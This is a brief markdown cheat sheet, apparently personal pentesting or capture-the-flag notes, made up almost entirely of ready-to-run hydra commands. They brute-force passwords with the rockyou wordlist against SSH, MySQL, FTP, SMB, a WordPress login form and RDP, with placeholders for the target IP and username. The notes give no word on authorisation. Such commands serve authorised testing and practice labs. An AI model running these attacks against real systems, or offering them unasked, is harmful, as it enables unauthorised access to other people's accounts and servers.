# Brute Force: Passwords Cracking
- If any server is running, you can use hydra to crack passwords. 
- Make sure the rockyou.txt file exists on the location and that you have right username and ip (replace them)

### cracking ssh
```shell 
hydra -l user -P /usr/share/wordlists/rockyou.txt $IP ssh
```

### crack mysql database server
```shell
hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP mysql
```

### crack ftp server
```shell
hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP ftp
```

### crack smb server
```shell
hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP smb
```

### crack wordpress
```shell
hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```

### crack rdp (windows screen sharing)
```shell
hydra -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$IP
```
